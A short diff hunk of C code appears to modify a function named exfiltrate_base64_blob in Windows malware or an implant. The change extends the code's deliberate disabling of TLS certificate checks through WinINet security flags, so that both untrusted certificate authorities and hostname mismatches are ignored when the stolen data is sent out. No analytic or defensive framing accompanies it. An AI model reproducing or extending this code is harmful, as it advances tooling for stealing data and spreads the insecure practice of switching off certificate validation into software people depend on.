@@ -131,8 +131,8 @@ void exfiltrate_base64_blob(const char *raw_payload)
     // Read the baseline security flags from the handle
     if (InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffLen))
     {
-        // Force the handle to ignore unknown/untrusted CAs (Error 12045)
-        dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
+        // Force the handle to ignore untrusted CAs AND hostname mismatches
+        dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
 
         // Apply the modified flags back to the handle
         InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
